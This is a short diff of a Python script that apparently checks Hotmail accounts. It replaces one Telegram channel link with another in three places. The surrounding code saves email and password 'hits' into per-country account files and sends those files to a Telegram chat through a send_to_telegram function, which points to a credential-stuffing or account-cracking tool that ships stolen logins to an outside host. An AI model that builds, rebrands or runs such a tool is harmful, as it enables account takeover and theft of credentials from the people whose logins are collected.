@@ -128,7 +128,7 @@ def save_hit_by_country(email, password, country):
             flag = get_flag(country)
             f.write(f"# {flag} {country} Accounts\n")
             f.write(f"# Created by {MY_SIGNATURE}\n")
-            f.write(f"# Channel: https://t.me/HoTmIlToOLs\n")
+            f.write(f"# Channel: https://t.me/keithtechsupport\n")
             f.write(f"# Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write(f"#\n\n")
     
@@ -361,7 +361,7 @@ def send_to_telegram(file_path, country_name):
             caption = (
                 f"{flag} <b>{country_name} Accounts</b>\n\n"
                 f"💎 {MY_SIGNATURE}\n"
-                f"📱 https://t.me/HoTmIlToOLs"
+                f"📱 https://t.me/keithtechsupport"
             )
             data = {
                 'chat_id': TELEGRAM_CHAT_ID,
@@ -461,7 +461,7 @@ def main():
     
     print(f"\n{G}Results saved in: Results/{W}")
     print(f"{M}💎 {MY_SIGNATURE}{W}")
-    print(f"{C}📱 https://t.me/HoTmIlToOLs{W}\n")
+    print(f"{C}📱 https://t.me/keithtechsupport{W}\n")
 
 if __name__ == "__main__":
     try:
